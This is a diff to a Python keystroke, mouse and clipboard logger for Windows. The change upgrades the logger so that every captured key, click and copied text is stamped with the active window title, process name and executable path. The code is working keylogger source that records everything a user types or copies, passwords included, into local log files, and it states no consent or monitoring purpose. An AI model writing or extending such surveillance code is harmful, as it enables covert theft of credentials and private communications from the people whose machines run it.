@@ -2,9 +2,11 @@ import os
 from datetime import datetime
 from pynput import keyboard, mouse
 import platform
-import win32gui  # For detecting active window on Windows
-import pyperclip  # For clipboard monitoring
-import threading  # To run clipboard monitoring in a separate thread
+import win32gui  # For active window
+import win32process  # For process details
+import psutil  # To fetch process details
+import pyperclip  # Clipboard monitoring
+import threading  # Separate thread for clipboard monitoring
 import time  # For periodic clipboard checks
 
 # Create a log directory
@@ -22,13 +24,18 @@ def write_log(data):
     except Exception as e:
         print(f"Error writing log: {e}")
 
-# Utility function: Get active application (Windows only)
-def get_active_window():
+# Utility function: Get active application with process info
+def get_active_window_with_context():
     try:
         window = win32gui.GetForegroundWindow()
-        return win32gui.GetWindowText(window)
+        pid = win32process.GetWindowThreadProcessId(window)[1]
+        process = psutil.Process(pid)
+        app_name = win32gui.GetWindowText(window)
+        process_name = process.name()
+        process_path = process.exe()
+        return f"{app_name} | Process: {process_name} | Path: {process_path}"
     except Exception as e:
-        return f"Error: {e}"
+        return f"Error retrieving application context: {e}"
 
 # Clipboard Monitoring
 def monitor_clipboard():
@@ -37,8 +44,8 @@ def monitor_clipboard():
         try:
             clipboard_content = pyperclip.paste()
             if clipboard_content != last_clipboard_content:  # Check if clipboard content has changed
-                app = get_active_window()
-                write_log(f"Clipboard Copied: '{clipboard_content}' in {app}")
+                app_context = get_active_window_with_context()
+                write_log(f"Clipboard Copied: '{clipboard_content}' in {app_context}")
                 last_clipboard_content = clipboard_content
         except Exception as e:
             write_log(f"Error monitoring clipboard: {e}")
@@ -47,20 +54,20 @@ def monitor_clipboard():
 # Keyboard Listener: Log keystrokes
 def on_key_press(key):
     try:
-        app = get_active_window()
+        app_context = get_active_window_with_context()
         if hasattr(key, 'char') and key.char is not None:
-            write_log(f"Key Pressed: '{key.char}' in {app}")
+            write_log(f"Key Pressed: '{key.char}' in {app_context}")
         else:
-            write_log(f"Special Key Pressed: {key} in {app}")
+            write_log(f"Special Key Pressed: {key} in {app_context}")
     except Exception as e:
         write_log(f"Error capturing key: {e}")
 
 # Mouse Listener: Log mouse clicks
 def on_click(x, y, button, pressed):
     try:
-        app = get_active_window()
+        app_context = get_active_window_with_context()
         action = "Pressed" if pressed else "Released"
-        write_log(f"Mouse {action}: {button} at ({x}, {y}) in {app}")
+        write_log(f"Mouse {action}: {button} at ({x}, {y}) in {app_context}")
     except Exception as e:
         write_log(f"Error capturing mouse event: {e}")
 
